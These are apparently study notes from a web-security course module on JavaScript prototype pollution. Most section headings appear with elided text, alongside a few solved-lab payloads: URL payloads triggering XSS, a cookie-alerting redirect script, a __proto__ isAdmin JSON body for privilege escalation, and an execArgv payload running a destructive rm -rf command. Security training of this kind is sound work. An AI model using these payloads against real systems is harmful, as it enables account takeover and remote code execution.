...
# 3 ## What is an object in JavaScript? - Continued
...
# 5 ## How does object inheritance work in JavaScript?
...
# 6 ## How does object inheritance work in JavaScript? - Continued
...
# 8 ## Accessing an object's prototype using __proto__
...
# 10 ## How do prototype pollution vulnerabilities arise?
...
# 11 ## How do prototype pollution vulnerabilities arise? - Continued
...
# 12 ## Prototype pollution sources
...
# 13 ## Prototype pollution via the URL
...
# 14 ## Prototype pollution via JSON input
...
# 16 ## Prototype pollution gadgets
...
# 17 ## Example of a prototype pollution gadget
...
# 18 ## Finding client-side prototype pollution sources manually
...
# 19 ## Finding client-side prototype pollution sources using DOM Invader
...
# 20 ## Finding client-side prototype pollution gadgets manually
...
# 21 ## Finding client-side prototype pollution gadgets using DOM Invader
...
# 22 ## Lab: DOM XSS via client-side prototype pollution
...
# 23 ## Lab: DOM XSS via an alternative prototype pollution vector
...
solution
```
/?__proto__.sequence=alert(1)-1
```

---

# 24 ## Prototype pollution via the constructor
...
# 25 ## Bypassing flawed key sanitization
...
# 26 ## Lab: Client-side prototype pollution via flawed sanitization
...
solution
```
/?__pro__proto__to__[transport_url]=data:text/javascript,alert('pwnmezaddy')
```

---

# 27 ## Prototype pollution in external libraries
...
# 28 ## Lab: Client-side prototype pollution in third-party libraries
...
```
<script>
document.location="https://0a0900f7043af2ca81bf1623008300c2.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>
```

---

# 29 ## Prototype pollution via browser APIs
...
# 30 ## Prototype pollution via fetch()
...
# 31 ## Prototype pollution via fetch() - Continued
...
``fetch('/my-products.json',{method:"GET"}) .then((response) => response.json()) .then((data) => { let username = data['x-username']; let message = document.querySelector('.message'); if(username) { message.innerHTML = `My products. Logged in as <b>${username}</b>`; } let productList = document.querySelector('ul.products'); for(let product of data) { let product = document.createElement('li'); product.append(product.name); productList.append(product); } }) .catch(console.error);``
...
# 32 ## Prototype pollution via Object.defineProperty()
...
# 33 ## Lab: Client-side prototype pollution via browser APIs
...
# 34 ## Server-side prototype pollution
...
# 35 ## Why is server-side prototype pollution more difficult to detect?
...
# 36 ## Detecting server-side prototype pollution via polluted property reflection
...
# 37 ## Detecting server-side prototype pollution via polluted property reflection - Continued
...
# 38 ## Detecting server-side prototype pollution via polluted property reflection - Continued
...
# 39 ## Lab: Privilege escalation via server-side prototype pollution
...
```
{
 ...
 "postcode":"a",
 "country":"a",
 "sessionId":"rYqwsInsRCVMRC8suqvLIBLVDGKa4V2U",
 "__proto__":{
  "foo":"bar",
  "isAdmin":"true"
  }
...
# 40 ## Detecting server-side prototype pollution without polluted property reflection
...
# 42 ## Status code override - Continued
...
# 44 ## JSON spaces override - Continued
...
# 48 ## Lab: Detecting server-side prototype pollution without polluted property reflection
...
[lab note](./labs/lab-server-side-prototype-pollution-property-reflection.md)

---

# 49 ## Scanning for server-side prototype pollution sources
...
1. Install the **Server-Side Prototype Pollution Scanner** extension from the BApp Store and make sure that it is enabled. For details on how to do this, see Installing extensions from the BApp Store
...
# 50 ## Scanning for server-side prototype pollution sources - Continued
...
# 51 ## Bypassing input filters for server-side prototype pollution
...
# 52 ## Lab: Bypassing flawed input filters for server-side prototype pollution
...
# 53 ## Remote code execution via server-side prototype pollution
...
# 54 ## Identifying a vulnerable request
...
# 55 ## Identifying a vulnerable request - Continued
...
# 56 ## Remote code execution via child_process.fork()
...
# 57 ## Lab: Remote code execution via server-side prototype pollution
...
payload
```
"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('rm -rf /home/carlos/morale.txt')" ] }
```

---

# 58 ## Remote code execution via child_process.execSync()
...
# 59 ## Remote code execution via child_process.execSync() - Continued
...
# 60 ## Remote code execution via child_process.execSync() - Continued
...
# 61 ## Preventing prototype pollution vulnerabilities
...
# 63 ## Preventing changes to prototype objects
...
# 64 ## Preventing an object from inheriting properties
...
# 65 ## Using safer alternatives where possible
...
`Object.prototype.evil = 'polluted'; let options = new Map(); options.set('transport_url', 'https://normal-website.com'); options.evil; // 'polluted' options.get('evil'); // undefined options.get('transport_url'); // 'https://normal-website.com'`
